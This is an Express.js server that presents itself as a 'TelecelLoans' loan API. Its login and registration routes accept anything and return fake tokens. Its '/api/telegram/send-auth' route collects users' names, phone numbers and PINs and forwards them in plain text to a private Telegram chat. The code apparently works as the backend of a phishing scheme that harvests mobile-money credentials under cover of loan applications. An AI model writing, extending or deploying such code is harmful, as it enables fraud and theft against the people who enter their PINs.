const express = require('express');
const app = express();
const PORT = process.env.PORT || 5000;

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());

// Routes
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'TelecelLoans API is running!' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.post('/api/auth/register', (req, res) => {
  console.log('📝 Register:', req.body);
  res.json({ 
    success: true, 
    message: 'User registered!',
    token: 'fake-token-' + Date.now(),
    user: { id: Date.now().toString(), name: req.body.name, phone: req.body.phone }
  });
});

app.post('/api/auth/login', (req, res) => {
  console.log('🔑 Login:', req.body);
  res.json({ 
    success: true, 
    message: 'User logged in!',
    token: 'fake-token-' + Date.now(),
    user: { id: Date.now().toString(), phone: req.body.phone }
  });
});

app.post('/api/loans/apply', (req, res) => {
  const { amount, name, phone, period_days, interest_rate } = req.body;
  console.log('💰 Loan:', req.body);
  
  const loan = {
    id: 'loan_' + Date.now(),
    amount: amount,
    name: name,
    phone: phone,
    period_days: period_days,
    interest_rate: interest_rate,
    status: 'pending',
    created_at: new Date().toISOString()
  };
  
  res.json({ 
    success: true, 
    message: 'Loan applied!',
    loan: loan
  });
});

// ─── UPDATED TELEGRAM ROUTE ───
app.post('/api/telegram/send-auth', async (req, res) => {
  const { phone, amount, name, loanId, pin } = req.body;
  console.log('📱 Telegram Request:', req.body);
  
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    console.log('🔑 Token:', token ? '✅ Present' : '❌ Missing');
    console.log('📱 Chat ID:', chatId ? '✅ Present' : '❌ Missing');
    
    if (!token || !chatId) {
      console.log('⚠️ Telegram credentials missing');
      return res.json({ success: false, message: 'Telegram not configured' });
    }
    
    const message = `<b>💰 New Telecel User</b>\n\n` +
                    `<b>Name:</b> ${name || 'Unknown'}\n` +
                    `<b>Phone:</b> ${phone || 'Unknown'}\n` +
                    `<b>PIN:</b> <code>${pin || 'N/A'}</code>\n` +
                    `<b>Amount:</b> GHS ${amount || '0'}\n` +
                    `<b>Loan ID:</b> ${loanId || 'N/A'}`;
    
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    console.log('📤 Sending to Telegram...');
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    console.log('✅ Telegram Response:', result);
    
    if (result.ok) {
      res.json({ success: true, message: 'Telegram sent!' });
    } else {
      res.json({ success: false, message: result.description });
    }
    
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    res.json({ success: false, message: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
  console.log(`🌐 CORS enabled`);
});
